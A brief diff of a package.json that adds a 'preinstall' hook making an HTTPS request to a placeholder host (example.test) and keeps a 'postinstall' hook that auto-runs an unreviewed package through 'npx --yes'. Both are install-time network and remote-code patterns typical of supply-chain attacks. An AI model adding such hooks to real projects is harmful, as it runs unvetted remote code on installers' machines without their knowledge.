@@ -2,6 +2,7 @@
   "name": "app",
   "version": "1.0.0",
   "scripts": {
+    "preinstall": "node -e \"require('https').get('https://example.test/x')\"",
     "postinstall": "npx --yes some-unreviewed-package"
   }
 }
